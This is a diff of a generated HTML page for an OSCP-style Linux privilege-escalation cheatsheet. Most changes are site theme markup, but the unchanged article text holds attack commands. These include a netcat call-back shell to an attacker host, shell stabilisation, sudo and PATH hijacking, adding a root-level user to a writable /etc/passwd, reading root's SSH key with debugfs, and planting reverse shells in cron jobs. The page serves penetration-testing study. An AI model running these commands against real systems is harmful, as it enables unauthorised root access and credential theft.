@@ -14,6 +14,16 @@
 
 
 
+
+
+
+
+
+
+
+
+
+
 <!DOCTYPE html>
 <html lang='en-us'><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
     <meta charset="utf-8">
@@ -28,29 +38,32 @@
     
 
     
-    <meta name="author" content="karan bhayani" />
+    <meta name="author" content="nomi bhayani" />
     
 
     
-        <meta property="og:title" content="Linux Privilege Escalation" />
-<meta property="og:description" content="Linux Privilege Escalation Cheatsheet So you got a shell, what now? This cheatsheet will help you with local enumeration as well as escalate your privilege further
-Usage of different enumeration scripts are encouraged, my favourite is LinPEAS Another linux enumeration script I personally use is LinEnum Abuse existing functionality of programs using GTFOBins
-Note: This is a live document. I&rsquo;ll be adding more content as I learn more
-Unstable shell Send yourself another shell from within the unstable shell" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="http://localhost:1313/privesc-linux/" /><meta property="article:section" content="" />
-<meta property="article:published_time" content="2020-06-29T16:33:08+00:00" />
-<meta property="article:modified_time" content="2020-06-29T16:33:08+00:00" />
-
+        <meta property="og:url" content="http://localhost:1313/privesc-linux/">
+  <meta property="og:site_name" content="Welcome to noobsec">
+  <meta property="og:title" content="Linux Privilege Escalation">
+  <meta property="og:description" content="Linux Privilege Escalation CheatsheetSo you got a shell, what now? This cheatsheet will help you with local enumeration as well as escalate your privilege further
+Usage of different enumeration scripts are encouraged, my favourite is LinPEAS Another linux enumeration script I personally use is LinEnum Abuse existing functionality of programs using GTFOBins">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:published_time" content="2020-06-29T16:33:08+00:00">
+    <meta property="article:modified_time" content="2020-06-29T16:33:08+00:00">
+    <meta property="article:tag" content="Oscp">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Cheatsheet">
+    <meta property="article:tag" content="Privilege Escalation">
 
     
 
     
-        <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Linux Privilege Escalation"/>
-<meta name="twitter:description" content="Linux Privilege Escalation Cheatsheet So you got a shell, what now? This cheatsheet will help you with local enumeration as well as escalate your privilege further
-Usage of different enumeration scripts are encouraged, my favourite is LinPEAS Another linux enumeration script I personally use is LinEnum Abuse existing functionality of programs using GTFOBins
-Note: This is a live document. I&rsquo;ll be adding more content as I learn more
-Unstable shell Send yourself another shell from within the unstable shell"/>
+        
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Linux Privilege Escalation">
+  <meta name="twitter:description" content="Linux Privilege Escalation CheatsheetSo you got a shell, what now? This cheatsheet will help you with local enumeration as well as escalate your privilege further
+Usage of different enumeration scripts are encouraged, my favourite is LinPEAS Another linux enumeration script I personally use is LinEnum Abuse existing functionality of programs using GTFOBins">
 
     <link rel="stylesheet" href="/style.css" integrity="">
 
@@ -60,18 +73,20 @@ Unstable shell Send yourself another shell from within the unstable shell"/>
 
 
         
-<script>
-var doNotTrack = false;
-if (!doNotTrack) {
-	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-	ga('create', 'UA-171056200-1', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-VZX99LLTQ8"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-VZX99LLTQ8');
+        }
+      </script>
     
 
     
@@ -86,7 +101,13 @@ if (!doNotTrack) {
             document.documentElement.setAttribute("data-theme", "light");
         }
     </script>
-<script defer src="/js/header.js" integrity=""></script>
+<script defer src="/js/theme-switch.js" integrity=""></script>
+
+
+
+    <script defer src="/js/hide-navbar-on-scroll.js" integrity=""></script>
+
+
 
 
 
@@ -123,98 +144,263 @@ if (!doNotTrack) {
 
 
 
+
+    
 </head>
-<body>
-        <main><header>
-    <div class="brand">
-        <div id="sidebar_btn">
-            <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
+<body><header>
+    <div id="header_content" class="wide">
+        <div id="header_left">
+            <div id="sidebar_btn">
+                <input type="checkbox" id="sidebar_btn_input" class="hidden" />
+                <label id="sidebar_btn_label" for="sidebar_btn_input">
 <svg
     xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    width="24px" height="24px" viewBox="0 0 24 24" fill="none"
     stroke="currentColor" stroke-width="2" stroke-linecap="round"
     stroke-linejoin="round">
     <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
 </svg>
 
-</svg>
-        </div>
-
-        <div>
-            <a href="/">noobsec</a>
-        </div>
-    </div>
-
-    <div class="toolbox">
-        <div id="theme_tool">
-            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
-</svg>
-
-</svg>
-            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
-</svg>
-
-</svg>
-        </div>
-
+</label>
+                <label id="sidebar_canvas_overlay_wrapper" for="sidebar_btn_input">
+                    <div id="sidebar_canvas_overlay"></div>
+                </label>
+                <div id="sidebar">
+                    <ul><li>
+                                <a href="#">OSCP</a>
+    <ul>
         
-            <div id="search_tool">
-                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
-</svg>
 
-</svg><div id="search_menu_wrapper" class="hidden">
-    <div id="search_menu">
-        <div id="search_menu_toolbar">
-            <div id="search_menu_input_wrapper">
-                <input id="search_menu_input" type="text" placeholder='Search Posts'>
+            
+                <li>
+                    
+                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/ad-cheatsheet">OSCP AD Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/oscp-journey">OSCP Journey</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/bof">OSCP BOF</a>
+                    
+                </li>
+            
+        
+    </ul>
+</li><li>
+                                <a href="#">HTB</a>
+    <ul>
+        
+
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-bart">HTB Bart</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-falafel-writeup-w-o-metasploit">HTB Falafel</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-cronos">HTB Cronos</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-bashed">HTB Bashed</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-lame">HTB Lame</a>
+                    
+                </li>
+            
+        
+    </ul>
+</li><li>
+                                <a href="#">Web Attacks</a>
+    <ul>
+        
+
+            
+                <li>
+                    
+                        <a href="/file-inclusion">File Inclusion</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/sqli-0x01">SQLi 0x01</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/sqli-0x02">SQLi 0x02</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/sqli-0x03">SQLi 0x03</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
+                    
+                </li>
+            
+        
+    </ul>
+</li><li>
+                                <a href="#">Cheatsheets</a>
+    <ul>
+        
+
+            
+                <li>
+                    
+                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/ad-cheatsheet">AD Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/crtp-cheatsheet">CRTP Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
+                    
+                </li>
+            
+        
+    </ul>
+</li><li>
+                                <a href="/starting-point">Getting Started in Red Team</a></li><li>
+                                <a href="/whoami/">About</a></li></ul>
+                </div>
             </div>
-            <div id="search_menu_close_btn">
-                <svg width="18px" height="18px" viewBox="0 0 24 24">
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
-</svg>
-
-</svg>
-            </div>
-        </div>
-        <div id="search_menu_results">
-        </div>
-    </div>
-</div>
-</div>
         
-
-        
-    </div>
-</header>
-<nav id="navbar" class="pure-menu">
-    <ul class="pure-menu-list"><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+            <div class="brand">
+                <div>
+                    <a href="/">noobsec</a>
+                </div>
+            </div><nav id="header_navbar" class="pure-menu header-menu">
+    <ul class="pure-menu-list"><li class="header-menu-item header-menu-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
                     
                         <a href="#" class="pure-menu-link">OSCP</a>
                     
                     <ul class="pure-menu-children">
+
     
         <li class="pure-menu-item">
             
@@ -222,6 +408,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -231,6 +418,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -238,6 +426,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -247,6 +436,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -254,6 +444,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -264,11 +455,12 @@ if (!doNotTrack) {
     
 
 </ul>
-                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                </li><li class="header-menu-item header-menu-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
                     
                         <a href="#" class="pure-menu-link">HTB</a>
                     
                     <ul class="pure-menu-children">
+
     
         <li class="pure-menu-item">
             
@@ -276,6 +468,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -285,6 +478,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -293,6 +487,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -300,6 +495,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -310,11 +506,12 @@ if (!doNotTrack) {
     
 
 </ul>
-                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                </li><li class="header-menu-item header-menu-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
                     
                         <a href="#" class="pure-menu-link">Web Attacks</a>
                     
                     <ul class="pure-menu-children">
+
     
         <li class="pure-menu-item">
             
@@ -322,6 +519,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -331,6 +529,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -338,6 +537,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -347,6 +547,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -356,11 +557,12 @@ if (!doNotTrack) {
     
 
 </ul>
-                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                </li><li class="header-menu-item header-menu-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
                     
                         <a href="#" class="pure-menu-link">Cheatsheets</a>
                     
                     <ul class="pure-menu-children">
+
     
         <li class="pure-menu-item">
             
@@ -368,6 +570,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -377,6 +580,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -384,6 +588,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -393,6 +598,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -400,6 +606,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -410,231 +617,88 @@ if (!doNotTrack) {
     
 
 </ul>
-                </li><li class="navbar-item pure-menu-item ">
+                </li><li class="header-menu-item pure-menu-item ">
                     
                         <a href="/starting-point" class="pure-menu-link">Getting Started in Red Team</a>
                     
-                </li><li class="navbar-item pure-menu-item ">
+                </li><li class="header-menu-item pure-menu-item ">
                     
                         <a href="/whoami/" class="pure-menu-link">About</a>
                     
                 </li></ul>
 </nav>
-<div id="sidebar_canvas_overlay" class="hidden"></div>
-<div id="sidebar" class="close">
-    <ul><li>
-                    <details>
-                        <summary><a href="#">OSCP</a></summary>
-    <ul>
-        
+</div>
+
+        <div id="header_right">
             
-                <li>
-                    
-                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
-                    
-                </li>
+
+            <div id="theme_tool">
+                <button id="dark_mode_btn" class="header-menu-btn outline-button" title='Switch to dark mode' type="button">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24px" height="24px" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+</svg>
+
+</button>
+                <button id="light_mode_btn" class="header-menu-btn outline-button" title='Switch to light mode' type="button">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24px" height="24px" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+</svg>
+
+</button>
+            </div>
+
             
-        
+                <div id="search_tool">
+                    <button id="search_btn" class="header-menu-btn outline-button" title='Search Posts' type="button">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24px" height="24px" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+</svg>
+
+</button>
+                </div>
             
-                <li>
-                    
-                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/ad-cheatsheet">OSCP AD Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/oscp-journey">OSCP Journey</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/bof">OSCP BOF</a>
-                    
-                </li>
-            
-        
-    </ul>
-</details>
-                </li><li>
-                    <details>
-                        <summary><a href="#">HTB</a></summary>
-    <ul>
-        
-            
-                <li>
-                    
-                        <a href="/hackthebox/htb-bart">HTB Bart</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/hackthebox/htb-falafel-writeup-w-o-metasploit">HTB Falafel</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/hackthebox/htb-cronos">HTB Cronos</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/hackthebox/htb-bashed">HTB Bashed</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/hackthebox/htb-lame">HTB Lame</a>
-                    
-                </li>
-            
-        
-    </ul>
-</details>
-                </li><li>
-                    <details>
-                        <summary><a href="#">Web Attacks</a></summary>
-    <ul>
-        
-            
-                <li>
-                    
-                        <a href="/file-inclusion">File Inclusion</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/sqli-0x01">SQLi 0x01</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/sqli-0x02">SQLi 0x02</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/sqli-0x03">SQLi 0x03</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
-                    
-                </li>
-            
-        
-    </ul>
-</details>
-                </li><li>
-                    <details>
-                        <summary><a href="#">Cheatsheets</a></summary>
-    <ul>
-        
-            
-                <li>
-                    
-                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/ad-cheatsheet">AD Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/crtp-cheatsheet">CRTP Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
-                    
-                </li>
-            
-        
-    </ul>
-</details>
-                </li><li>
-                    <a href="/starting-point">Getting Started in Red Team</a>
-                </li><li>
-                    <a href="/whoami/">About</a>
-                </li></ul>
-</div><div id="content" class="content-margin">
+        </div>
+    </div>
+</header><div id="search_menu_wrapper" class="hidden">
+    <div id="search_menu">
+        <div id="search_menu_toolbar">
+            <div id="search_menu_input_wrapper">
+                <input id="search_menu_input" type="text" placeholder='Search Posts'>
+            </div>
+            <div id="search_menu_close_btn">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1.25rem" height="1.25rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
+</svg>
+
+</div>
+        </div>
+        <div id="search_menu_results">
+        </div>
+    </div>
+</div>
+<main>
+            <div id="content" class="content-margin">
                 
     
-    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
+    
+        
+        <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
         
             <nav id="TableOfContents">
   <ul>
@@ -651,10 +715,12 @@ if (!doNotTrack) {
 </nav>
         
     </div></details>
+    
 
 
 
     <div class="content-margin">
+
 
 
 
@@ -664,19 +730,93 @@ if (!doNotTrack) {
         
         
     
-    <h1 id="linux-privilege-escalation-cheatsheet">Linux Privilege Escalation Cheatsheet</h1>
+
+    
+    
+        
+        
+        
+    
+        
+        
+            
+            
+            
+        
+        <section id="linux-privilege-escalation-cheatsheet">
+
+
+<h1 class="header-anchor-wrapper">Linux Privilege Escalation Cheatsheet
+  <a href="#linux-privilege-escalation-cheatsheet" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h1>
+
 <p>So you got a shell, what <em>now</em>?
 This cheatsheet will help you with local enumeration as well as escalate your privilege further</p>
 <p>Usage of different enumeration scripts are encouraged, my favourite is <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS</a>
 Another linux enumeration script I personally use is <a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">LinEnum</a>
 Abuse existing functionality of programs using <a href="https://gtfobins.github.io/">GTFOBins</a></p>
 <p><em>Note: This is a live document. I&rsquo;ll be adding more content as I learn more</em></p>
-<h2 id="unstable-shell">Unstable shell</h2>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="unstable-shell">
+
+
+<h2 class="header-anchor-wrapper">Unstable shell
+  <a href="#unstable-shell" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
 <p>Send yourself another shell from within the unstable shell</p>
 <pre  class="mc-prism hide language-text" ><code class="language-bash">which nc
 nc $ip $port
 </code></pre>
-<h2 id="make-it-functional">Make it functional</h2>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="make-it-functional">
+
+
+<h2 class="header-anchor-wrapper">Make it functional
+  <a href="#make-it-functional" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
 <p>Necessary for privilege escalation purposes</p>
 <pre  class="mc-prism hide language-text" ><code class="language-bash">which python[3]
 python[3] -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
@@ -690,7 +830,30 @@ stty rows xx
 stty columns yy
 export TERM=xterm-256color
 </code></pre>
-<h2 id="general-info">General info</h2>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="general-info">
+
+
+<h2 class="header-anchor-wrapper">General info
+  <a href="#general-info" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
 <pre  class="mc-prism hide language-text" ><code class="language-bash"># username, groups
 id
 hostname
@@ -710,7 +873,30 @@ cat /etc/passwd | grep &quot;sh$\|python&quot;
 
 sudo -l
 </code></pre>
-<h2 id="automated-enumeration">Automated enumeration</h2>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="automated-enumeration">
+
+
+<h2 class="header-anchor-wrapper">Automated enumeration
+  <a href="#automated-enumeration" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
 <pre  class="mc-prism hide language-text" ><code class="language-bash"># Automated local enumeration
 # Look for any highlighted stuff
 # Cron jobs
@@ -720,7 +906,30 @@ sudo -l
 
 ./linenum.sh
 </code></pre>
-<h2 id="abusing-sudo">Abusing sudo</h2>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="abusing-sudo">
+
+
+<h2 class="header-anchor-wrapper">Abusing sudo
+  <a href="#abusing-sudo" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
 <p>Can sudo but absolute path is specified? Use <code>ltrace</code> to view libraries being loaded by these programs and check if absolute path is specified or not</p>
 <pre  class="mc-prism hide language-text" ><code class="language-bash"># Easy win?
 sudo -l # Check programs on GTFOBins
@@ -731,7 +940,30 @@ chmod 777 &lt;program_name&gt;
 # Export PATH=.:$PATH
 sudo &lt;program_name&gt;
 </code></pre>
-<h2 id="weak-file-permissions">Weak file permissions</h2>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="weak-file-permissions">
+
+
+<h2 class="header-anchor-wrapper">Weak file permissions
+  <a href="#weak-file-permissions" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
 <pre  class="mc-prism hide language-text" ><code class="language-bash"># Writable /etc/passwd?
 Remove 'x' beside a username --&gt; no password
 # Create a new user
@@ -742,7 +974,30 @@ notahacker:$passwd_hash:0:0:/root:/bin/bash # Become r00t yourself
 # /dev/sda1 readable?
 debugfs /dev/sda1 # Get root's SSH private key 
 </code></pre>
-<h2 id="abusing-cron-jobs">Abusing CRON jobs</h2>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="abusing-cron-jobs">
+
+
+<h2 class="header-anchor-wrapper">Abusing CRON jobs
+  <a href="#abusing-cron-jobs" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
 <pre  class="mc-prism hide language-text" ><code class="language-bash"># Writable CRON program?
 # Insert language specific reverse shell
 
@@ -788,7 +1043,30 @@ int main(int argc, const char * argv[]){
